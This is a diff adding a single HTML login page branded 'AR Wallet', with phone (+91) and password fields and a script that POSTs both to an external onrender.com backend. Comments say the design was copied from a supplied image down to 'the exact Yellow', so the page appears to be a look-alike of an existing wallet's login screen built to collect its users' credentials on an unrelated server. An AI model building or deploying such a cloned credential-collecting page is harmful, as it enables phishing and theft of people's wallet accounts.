@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AR Wallet - Account Login</title>
+    <style>
+        /* CSS STYLES - The Visual Design */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-color: #9499a6; /* The gray background from your image */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .login-container {
+            background-color: #ffffff;
+            width: 100%;
+            max-width: 420px;
+            min-height: 600px;
+            padding: 40px 30px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+            position: relative;
+        }
+
+        .lang-selector {
+            text-align: right;
+            font-size: 14px;
+            color: #333;
+            margin-bottom: 20px;
+            cursor: pointer;
+        }
+
+        h2 {
+            font-size: 32px;
+            font-weight: 700;
+            color: #1a1a1a;
+            margin-bottom: 30px;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 15px;
+            font-weight: 500;
+            color: #333;
+        }
+
+        .input-box {
+            display: flex;
+            align-items: center;
+            background-color: #f2f5f7;
+            border-radius: 4px;
+            padding: 12px 15px;
+            border: 1px solid transparent;
+        }
+
+        .input-box:focus-within {
+            border: 1px solid #ffc107;
+        }
+
+        .country-select {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding-right: 10px;
+            margin-right: 10px;
+            border-right: 1px solid #ddd;
+            font-weight: bold;
+            color: #333;
+        }
+
+        .country-select img {
+            width: 24px;
+            height: 16px;
+            object-fit: cover;
+        }
+
+        input {
+            width: 100%;
+            border: none;
+            background: transparent;
+            outline: none;
+            font-size: 14px;
+            color: #333;
+        }
+
+        .password-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 8px;
+        }
+
+        .forgot-link {
+            color: #e6a500;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .eye-btn {
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: #999;
+            font-size: 18px;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-bottom: 15px;
+            transition: 0.3s;
+        }
+
+        .btn-login {
+            background-color: #ffc107; /* The exact Yellow */
+            color: #000;
+            margin-top: 20px;
+        }
+
+        .btn-login:hover {
+            background-color: #e6af00;
+        }
+
+        .btn-help {
+            background-color: #edf1f4;
+            color: #666;
+        }
+
+        .register-text {
+            text-align: center;
+            margin-top: 30px;
+            font-size: 14px;
+            color: #666;
+        }
+
+        .register-text a {
+            color: #e6a500;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        /* Responsive for mobile */
+        @media (max-width: 480px) {
+            .login-container {
+                height: 100vh;
+                max-width: 100%;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-container">
+        <div class="lang-selector">🌐 English</div>
+
+        <h2>Account Login</h2>
+
+        <!-- FORM STARTS HERE -->
+        <form id="loginForm">
+            <!-- Phone Input -->
+            <div class="input-group">
+                <label>Phone Number</label>
+                <div class="input-box">
+                    <div class="country-select">
+                        <img src="https://flagcdn.com/in.svg" alt="India"> 
+                        <span>+91</span>
+                    </div>
+                    <input type="text" id="phone" placeholder="Please enter your phone number." required>
+                </div>
+            </div>
+
+            <!-- Password Input -->
+            <div class="input-group">
+                <div class="password-row">
+                    <label>Password</label>
+                    <a href="#" class="forgot-link">Forgot Password?</a>
+                </div>
+                <div class="input-box">
+                    <input type="password" id="password" placeholder="Please enter your login password." required>
+                    <button type="button" class="eye-btn" onclick="togglePassword()">👁️</button>
+                </div>
+            </div>
+
+            <!-- Action Buttons -->
+            <button type="submit" class="btn btn-login">Log In</button>
+            <button type="button" class="btn btn-help">Help Center</button>
+        </form>
+
+        <div class="register-text">
+            No Account? <a href="#">Register Now»</a>
+        </div>
+    </div>
+
+    <script>
+        // 1. Function to show/hide password
+        function togglePassword() {
+            const passInput = document.getElementById('password');
+            passInput.type = passInput.type === 'password' ? 'text' : 'password';
+        }
+
+    </script>
+<script>
+document.getElementById('loginForm').addEventListener('submit', async (e) => {
+    e.preventDefault();
+
+    const phone = document.getElementById('phone').value;
+    const password = document.getElementById('password').value;
+
+    try {
+        console.log("Sending request...");
+
+        const response = await fetch('https://backend-2-4bih.onrender.com/login', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ phone, password })
+        });
+
+        console.log("Response status:", response.status);
+
+        const data = await response.text();
+        console.log("Response data:", data);
+
+        alert(data);
+
+    } catch (error) {
+        console.log("FULL ERROR:", error);
+        alert("Error: " + error.message);
+    }
+});
+</script>
+
+ 
+</body>
+</html>
